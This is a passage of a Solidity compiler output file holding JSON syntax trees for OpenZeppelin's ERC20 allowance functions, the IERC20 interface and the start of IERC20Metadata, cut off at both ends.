{_approve}."},"id":750,"implemented":true,"kind":"function","modifiers":[],"name":"_approve","nameLocation":"9958:8:2","nodeType":"FunctionDefinition","parameters":{"id":700,"nodeType":"ParameterList","parameters":[{"constant":false,"id":693,"mutability":"mutable","name":"owner","nameLocation":"9975:5:2","nodeType":"VariableDeclaration","scope":750,"src":"9967:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":692,"name":"address","nodeType":"ElementaryTypeName","src":"9967:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":695,"mutability":"mutable","name":"spender","nameLocation":"9990:7:2","nodeType":"VariableDeclaration","scope":750,"src":"9982:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":694,"name":"address","nodeType":"ElementaryTypeName","src":"9982:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":697,"mutability":"mutable","name":"value","nameLocation":"10007:5:2","nodeType":"VariableDeclaration","scope":750,"src":"9999:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":696,"name":"uint256","nodeType":"ElementaryTypeName","src":"9999:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":699,"mutability":"mutable","name":"emitEvent","nameLocation":"10019:9:2","nodeType":"VariableDeclaration","scope":750,"src":"10014:14:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":698,"name":"bool","nodeType":"ElementaryTypeName","src":"10014:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"9966:63:2"},"returnParameters":{"id":701,"nodeType":"ParameterList","parameters":[],"src":"10047:0:2"},"scope":799,"src":"9949:432:2","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":797,"nodeType":"Block","src":"10752:388:2","statements":[{"assignments":[761],"declarations":[{"constant":false,"id":761,"mutability":"mutable","name":"currentAllowance","nameLocation":"10770:16:2","nodeType":"VariableDeclaration","scope":797,"src":"10762:24:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":760,"name":"uint256","nodeType":"ElementaryTypeName","src":"10762:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":766,"initialValue":{"arguments":[{"id":763,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":753,"src":"10799:5:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":764,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":755,"src":"10806:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"}],"id":762,"name":"allowance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":426,"src":"10789:9:2","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$_t_address_$returns$_t_uint256_$","typeString":"function (address,address) view returns (uint256)"}},"id":765,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10789:25:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"10762:52:2"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":773,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":767,"name":"currentAllowance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":761,"src":"10828:16:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"expression":{"arguments":[{"id":770,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10853:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":769,"name":"uint256","nodeType":"ElementaryTypeName","src":"10853:7:2","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"}],"id":768,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"10848:4:2","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":771,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10848:13:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint256","typeString":"type(uint256)"}},"id":772,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"10862:3:2","memberName":"max","nodeType":"MemberAccess","src":"10848:17:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10828:37:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":796,"nodeType":"IfStatement","src":"10824:310:2","trueBody":{"id":795,"nodeType":"Block","src":"10867:267:2","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":776,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":774,"name":"currentAllowance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":761,"src":"10885:16:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":775,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":757,"src":"10904:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10885:24:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":784,"nodeType":"IfStatement","src":"10881:130:2","trueBody":{"id":783,"nodeType":"Block","src":"10911:100:2","statements":[{"errorCall":{"arguments":[{"id":778,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":755,"src":"10963:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":779,"name":"currentAllowance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":761,"src":"10972:16:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":780,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":757,"src":"10990:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":777,"name":"ERC20InsufficientAllowance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":178,"src":"10936:26:2","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,uint256,uint256) pure"}},"id":781,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10936:60:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":782,"nodeType":"RevertStatement","src":"10929:67:2"}]}},{"id":794,"nodeType":"UncheckedBlock","src":"11024:100:2","statements":[{"expression":{"arguments":[{"id":786,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":753,"src":"11061:5:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":787,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":755,"src":"11068:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":790,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":788,"name":"currentAllowance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":761,"src":"11077:16:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"id":789,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":757,"src":"11096:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"11077:24:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"66616c7365","id":791,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"11103:5:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_bool","typeString":"bool"}],"id":785,"name":"_approve","nodeType":"Identifier","overloadedDeclarations":[690,750],"referencedDeclaration":750,"src":"11052:8:2","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bool_$returns$__$","typeString":"function (address,address,uint256,bool)"}},"id":792,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11052:57:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":793,"nodeType":"ExpressionStatement","src":"11052:57:2"}]}]}}]},"documentation":{"id":751,"nodeType":"StructuredDocumentation","src":"10387:271:2","text":" @dev Updates `owner` s allowance for `spender` based on spent `value`.\n Does not update the allowance value in case of infinite allowance.\n Revert if not enough allowance is available.\n Does not emit an {Approval} event."},"id":798,"implemented":true,"kind":"function","modifiers":[],"name":"_spendAllowance","nameLocation":"10672:15:2","nodeType":"FunctionDefinition","parameters":{"id":758,"nodeType":"ParameterList","parameters":[{"constant":false,"id":753,"mutability":"mutable","name":"owner","nameLocation":"10696:5:2","nodeType":"VariableDeclaration","scope":798,"src":"10688:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":752,"name":"address","nodeType":"ElementaryTypeName","src":"10688:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":755,"mutability":"mutable","name":"spender","nameLocation":"10711:7:2","nodeType":"VariableDeclaration","scope":798,"src":"10703:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":754,"name":"address","nodeType":"ElementaryTypeName","src":"10703:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":757,"mutability":"mutable","name":"value","nameLocation":"10728:5:2","nodeType":"VariableDeclaration","scope":798,"src":"10720:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":756,"name":"uint256","nodeType":"ElementaryTypeName","src":"10720:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10687:47:2"},"returnParameters":{"id":759,"nodeType":"ParameterList","parameters":[],"src":"10752:0:2"},"scope":799,"src":"10663:477:2","stateMutability":"nonpayable","virtual":true,"visibility":"internal"}],"scope":800,"src":"1401:9741:2","usedErrors":[159,164,169,178,183,188],"usedEvents":[811,820]}],"src":"105:11038:2"},"id":2},"@openzeppelin/contracts/token/ERC20/IERC20.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/token/ERC20/IERC20.sol","exportedSymbols":{"IERC20":[877]},"id":878,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":801,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"106:24:3"},{"abstract":false,"baseContracts":[],"canonicalName":"IERC20","contractDependencies":[],"contractKind":"interface","documentation":{"id":802,"nodeType":"StructuredDocumentation","src":"132:70:3","text":" @dev Interface of the ERC20 standard as defined in the EIP."},"fullyImplemented":false,"id":877,"linearizedBaseContracts":[877],"name":"IERC20","nameLocation":"213:6:3","nodeType":"ContractDefinition","nodes":[{"anonymous":false,"documentation":{"id":803,"nodeType":"StructuredDocumentation","src":"226:158:3","text":" @dev Emitted when `value` tokens are moved from one account (`from`) to\n another (`to`).\n Note that `value` may be zero."},"eventSelector":"ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef","id":811,"name":"Transfer","nameLocation":"395:8:3","nodeType":"EventDefinition","parameters":{"id":810,"nodeType":"ParameterList","parameters":[{"constant":false,"id":805,"indexed":true,"mutability":"mutable","name":"from","nameLocation":"420:4:3","nodeType":"VariableDeclaration","scope":811,"src":"404:20:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":804,"name":"address","nodeType":"ElementaryTypeName","src":"404:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":807,"indexed":true,"mutability":"mutable","name":"to","nameLocation":"442:2:3","nodeType":"VariableDeclaration","scope":811,"src":"426:18:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":806,"name":"address","nodeType":"ElementaryTypeName","src":"426:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":809,"indexed":false,"mutability":"mutable","name":"value","nameLocation":"454:5:3","nodeType":"VariableDeclaration","scope":811,"src":"446:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":808,"name":"uint256","nodeType":"ElementaryTypeName","src":"446:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"403:57:3"},"src":"389:72:3"},{"anonymous":false,"documentation":{"id":812,"nodeType":"StructuredDocumentation","src":"467:148:3","text":" @dev Emitted when the allowance of a `spender` for an `owner` is set by\n a call to {approve}. `value` is the new allowance."},"eventSelector":"8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925","id":820,"name":"Approval","nameLocation":"626:8:3","nodeType":"EventDefinition","parameters":{"id":819,"nodeType":"ParameterList","parameters":[{"constant":false,"id":814,"indexed":true,"mutability":"mutable","name":"owner","nameLocation":"651:5:3","nodeType":"VariableDeclaration","scope":820,"src":"635:21:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":813,"name":"address","nodeType":"ElementaryTypeName","src":"635:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":816,"indexed":true,"mutability":"mutable","name":"spender","nameLocation":"674:7:3","nodeType":"VariableDeclaration","scope":820,"src":"658:23:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":815,"name":"address","nodeType":"ElementaryTypeName","src":"658:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":818,"indexed":false,"mutability":"mutable","name":"value","nameLocation":"691:5:3","nodeType":"VariableDeclaration","scope":820,"src":"683:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":817,"name":"uint256","nodeType":"ElementaryTypeName","src":"683:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"634:63:3"},"src":"620:78:3"},{"documentation":{"id":821,"nodeType":"StructuredDocumentation","src":"704:65:3","text":" @dev Returns the value of tokens in existence."},"functionSelector":"18160ddd","id":826,"implemented":false,"kind":"function","modifiers":[],"name":"totalSupply","nameLocation":"783:11:3","nodeType":"FunctionDefinition","parameters":{"id":822,"nodeType":"ParameterList","parameters":[],"src":"794:2:3"},"returnParameters":{"id":825,"nodeType":"ParameterList","parameters":[{"constant":false,"id":824,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":826,"src":"820:7:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":823,"name":"uint256","nodeType":"ElementaryTypeName","src":"820:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"819:9:3"},"scope":877,"src":"774:55:3","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":827,"nodeType":"StructuredDocumentation","src":"835:71:3","text":" @dev Returns the value of tokens owned by `account`."},"functionSelector":"70a08231","id":834,"implemented":false,"kind":"function","modifiers":[],"name":"balanceOf","nameLocation":"920:9:3","nodeType":"FunctionDefinition","parameters":{"id":830,"nodeType":"ParameterList","parameters":[{"constant":false,"id":829,"mutability":"mutable","name":"account","nameLocation":"938:7:3","nodeType":"VariableDeclaration","scope":834,"src":"930:15:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":828,"name":"address","nodeType":"ElementaryTypeName","src":"930:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"929:17:3"},"returnParameters":{"id":833,"nodeType":"ParameterList","parameters":[{"constant":false,"id":832,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":834,"src":"970:7:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":831,"name":"uint256","nodeType":"ElementaryTypeName","src":"970:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"969:9:3"},"scope":877,"src":"911:68:3","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":835,"nodeType":"StructuredDocumentation","src":"985:213:3","text":" @dev Moves a `value` amount of tokens from the caller's account to `to`.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."},"functionSelector":"a9059cbb","id":844,"implemented":false,"kind":"function","modifiers":[],"name":"transfer","nameLocation":"1212:8:3","nodeType":"FunctionDefinition","parameters":{"id":840,"nodeType":"ParameterList","parameters":[{"constant":false,"id":837,"mutability":"mutable","name":"to","nameLocation":"1229:2:3","nodeType":"VariableDeclaration","scope":844,"src":"1221:10:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":836,"name":"address","nodeType":"ElementaryTypeName","src":"1221:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":839,"mutability":"mutable","name":"value","nameLocation":"1241:5:3","nodeType":"VariableDeclaration","scope":844,"src":"1233:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":838,"name":"uint256","nodeType":"ElementaryTypeName","src":"1233:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1220:27:3"},"returnParameters":{"id":843,"nodeType":"ParameterList","parameters":[{"constant":false,"id":842,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":844,"src":"1266:4:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":841,"name":"bool","nodeType":"ElementaryTypeName","src":"1266:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"1265:6:3"},"scope":877,"src":"1203:69:3","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"documentation":{"id":845,"nodeType":"StructuredDocumentation","src":"1278:264:3","text":" @dev Returns the remaining number of tokens that `spender` will be\n allowed to spend on behalf of `owner` through {transferFrom}. This is\n zero by default.\n This value changes when {approve} or {transferFrom} are called."},"functionSelector":"dd62ed3e","id":854,"implemented":false,"kind":"function","modifiers":[],"name":"allowance","nameLocation":"1556:9:3","nodeType":"FunctionDefinition","parameters":{"id":850,"nodeType":"ParameterList","parameters":[{"constant":false,"id":847,"mutability":"mutable","name":"owner","nameLocation":"1574:5:3","nodeType":"VariableDeclaration","scope":854,"src":"1566:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":846,"name":"address","nodeType":"ElementaryTypeName","src":"1566:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":849,"mutability":"mutable","name":"spender","nameLocation":"1589:7:3","nodeType":"VariableDeclaration","scope":854,"src":"1581:15:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":848,"name":"address","nodeType":"ElementaryTypeName","src":"1581:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1565:32:3"},"returnParameters":{"id":853,"nodeType":"ParameterList","parameters":[{"constant":false,"id":852,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":854,"src":"1621:7:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":851,"name":"uint256","nodeType":"ElementaryTypeName","src":"1621:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1620:9:3"},"scope":877,"src":"1547:83:3","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":855,"nodeType":"StructuredDocumentation","src":"1636:667:3","text":" @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n caller's tokens.\n Returns a boolean value indicating whether the operation succeeded.\n IMPORTANT: Beware that changing an allowance with this method brings the risk\n that someone may use both the old and the new allowance by unfortunate\n transaction ordering. One possible solution to mitigate this race\n condition is to first reduce the spender's allowance to 0 and set the\n desired value afterwards:\n https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n Emits an {Approval} event."},"functionSelector":"095ea7b3","id":864,"implemented":false,"kind":"function","modifiers":[],"name":"approve","nameLocation":"2317:7:3","nodeType":"FunctionDefinition","parameters":{"id":860,"nodeType":"ParameterList","parameters":[{"constant":false,"id":857,"mutability":"mutable","name":"spender","nameLocation":"2333:7:3","nodeType":"VariableDeclaration","scope":864,"src":"2325:15:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":856,"name":"address","nodeType":"ElementaryTypeName","src":"2325:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":859,"mutability":"mutable","name":"value","nameLocation":"2350:5:3","nodeType":"VariableDeclaration","scope":864,"src":"2342:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":858,"name":"uint256","nodeType":"ElementaryTypeName","src":"2342:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2324:32:3"},"returnParameters":{"id":863,"nodeType":"ParameterList","parameters":[{"constant":false,"id":862,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":864,"src":"2375:4:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":861,"name":"bool","nodeType":"ElementaryTypeName","src":"2375:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"2374:6:3"},"scope":877,"src":"2308:73:3","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"documentation":{"id":865,"nodeType":"StructuredDocumentation","src":"2387:297:3","text":" @dev Moves a `value` amount of tokens from `from` to `to` using the\n allowance mechanism. `value` is then deducted from the caller's\n allowance.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."},"functionSelector":"23b872dd","id":876,"implemented":false,"kind":"function","modifiers":[],"name":"transferFrom","nameLocation":"2698:12:3","nodeType":"FunctionDefinition","parameters":{"id":872,"nodeType":"ParameterList","parameters":[{"constant":false,"id":867,"mutability":"mutable","name":"from","nameLocation":"2719:4:3","nodeType":"VariableDeclaration","scope":876,"src":"2711:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":866,"name":"address","nodeType":"ElementaryTypeName","src":"2711:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":869,"mutability":"mutable","name":"to","nameLocation":"2733:2:3","nodeType":"VariableDeclaration","scope":876,"src":"2725:10:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":868,"name":"address","nodeType":"ElementaryTypeName","src":"2725:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":871,"mutability":"mutable","name":"value","nameLocation":"2745:5:3","nodeType":"VariableDeclaration","scope":876,"src":"2737:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":870,"name":"uint256","nodeType":"ElementaryTypeName","src":"2737:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2710:41:3"},"returnParameters":{"id":875,"nodeType":"ParameterList","parameters":[{"constant":false,"id":874,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":876,"src":"2770:4:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":873,"name":"bool","nodeType":"ElementaryTypeName","src":"2770:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"2769:6:3"},"scope":877,"src":"2689:87:3","stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"scope":878,"src":"203:2575:3","usedErrors":[],"usedEvents":[811,820]}],"src":"106:2673:3"},"id":3},"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol","exportedSymbols":{"IERC20":[877],"IERC20Metadata":[903]},"id":904,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":879,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"125:24:4"},{"absolutePath":"@openzeppelin/contracts/token/ERC20/IERC20.sol","file":"../IERC20.sol","id":881,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":904,"sourceUnit":878,"src":"151:37:4","symbolAliases":[{"foreign":{"id":880,"name":"IERC20","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":877,"src":"159:6:4","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":false,"baseContracts":[{"baseName":{"id":883,"name":"IERC20","nameLocations":["305:6:4"],"nodeType":"IdentifierPath","referencedDeclaration":877,"src":"305:6:4"},"id":884,"nodeType":"InheritanceSpecifier","src":"305:6:4"}],"canonicalName":"IERC20Metadata","contractDependencies":[],"contractKind":"interface","documentation":{"id":882,"nodeType":"StructuredDocumentation","src":"190:86:4","text":" @dev Interface for the optional metadata functions from the ERC20 standard."},"fullyImplemented":false,"id":903,"linearizedBaseContracts":[903,877],"name":"IERC20Metadata","nameLocation":"287:14:4","nodeType":"ContractDefinition","nodes":[{"documentation":{"id":885,"nodeType":"StructuredDocumentation","src":"318:54:4","text":" @dev Returns the name of the token."},"functionSelector":"06fdde03","id":890,"implemented":false,"kind":"function","modifiers":[],"name":"name","nameLocation":"386:4:4","nodeType":"FunctionDefinition","parameters":{"id":886,"nodeType":"ParameterList","parameters":[],"src":"390:2:4"},"returnParameters":{"id":889,"nodeType":"ParameterList","parameters":[{"constant":false,"id":888,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":890,"src":"416:13:4","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":887,"name":"string","nodeType":"ElementaryTypeName","src":"416:6:4","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"415:15:4"},"scope":903,"src":"377:54:4","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":891,"nodeType":"StructuredDocumentation","src":"437:56:4","text":" @dev Returns the symbol of 